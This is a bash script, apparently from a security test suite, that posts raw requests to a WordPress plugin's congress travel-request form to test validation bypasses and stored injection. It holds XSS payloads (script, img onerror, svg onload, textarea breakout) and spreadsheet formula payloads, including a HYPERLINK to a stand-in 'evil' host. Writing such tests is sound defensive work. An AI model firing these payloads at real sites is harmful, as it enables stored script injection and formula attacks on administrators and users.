#!/usr/bin/env bash
# Raw POST to admin-post.php?action=asset_demande_submit: validation bypass + stored XSS / formula payloads.
. "$(dirname "$0")/lib.sh"
URL=$(curl -s "$B/wp-json/wp/v2/asset_congres?per_page=1&_fields=link" | grep -oE 'http[^"]+' | sed 's#\\##g' | head -1)
F=$(as anon -c out/anon.cj "$URL"); N=$(echo "$F" | grep -oE 'name="asset_nonce" value="[a-f0-9]+' | grep -oE '[a-f0-9]+$')
TS=$(echo "$F" | grep -oE 'name="form_ts" value="[^"]+' | sed 's/.*value="//'); CID=$(echo "$F" | grep -oE 'name="congres_id" value="[0-9]+' | grep -oE '[0-9]+$')
echo "url=$URL cid=$CID nonce=${N:+ok} ts=${TS:+ok}"; sleep 4
post(){ curl -s -b out/anon.cj -o /dev/null -w "%{http_code} %{redirect_url}\n" "$B/wp-admin/admin-post.php" -d "action=asset_demande_submit&congres_id=$CID&asset_nonce=$N&form_ts=$TS&form_token=$(openssl rand -hex 16)" "$@"; }
A=$(date -d '+30 days' +%F); R=$(date -d '+35 days' +%F)
X='"><script>alert(1)</script><img src=x onerror=alert(1)>'
echo "-- bypass: pax=0"; post --data-urlencode "nom=a" -d "email=a@example.com&telephone=0102030405&ville_depart=Paris&date_aller=$A&date_retour=$R&passagers=0&consentement=1"
echo "-- bypass: pax[]"; post --data-urlencode "nom=a" -d "email=a@example.com&telephone=0102030405&ville_depart=Paris&date_aller=$A&date_retour=$R&passagers[]=5&consentement=1"
echo "-- bypass: no consent"; post --data-urlencode "nom=a" -d "email=a@example.com&telephone=0102030405&ville_depart=Paris&date_aller=$A&date_retour=$R&passagers=2"
echo "-- bypass: draft congress id"; curl -s -b out/anon.cj -o /dev/null -w "%{http_code}\n" "$B/wp-admin/admin-post.php" -d "action=asset_demande_submit&congres_id=40&asset_nonce=$N"
echo "-- hostile accepted"; post --data-urlencode "nom==HYPERLINK(\"http://evil\")$X" --data-urlencode "email=x@example.com" -d "telephone=0102030405" --data-urlencode "societe=@SUM(1)$X" --data-urlencode "ville_depart=-2+3$X" -d "date_aller=$A&date_retour=$R&passagers=2&consentement=1" --data-urlencode "message=$X
line2 </textarea><svg onload=alert(3)>"
